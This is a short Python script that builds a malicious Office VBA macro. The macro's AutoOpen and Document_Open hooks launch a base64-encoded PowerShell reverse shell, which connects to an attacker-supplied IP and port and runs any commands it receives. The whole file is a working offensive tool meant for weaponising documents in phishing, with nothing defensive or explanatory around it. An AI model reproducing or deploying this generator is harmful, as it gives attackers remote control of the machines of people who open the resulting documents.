#!/usr/bin/python3
import sys
import base64

def help():
    print("Use: %s IP PORT" % sys.argv[0])
    print("Print the macro to get a reverse shell with powershell")
    exit()
    
try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

encodedPayload = base64.b64encode(payload.encode('utf16')[2:]).decode()

str=""
n=50
for i in range(0,len(encodedPayload),n):
    str+="\tStr = str+" + '"' + encodedPayload[i:i+n] +'"\n'

output="""
    Sub AutoOpen()
        MyMacro
    End Sub

    Sub Document_Open()
        MyMacro
    End Sub

    Sub MyMacro()
        Dim Str As String
        
%s
                                                        
        Shell ("cmd /c powershell -e " & Str)
    End Sub
""" % (str)
print(output)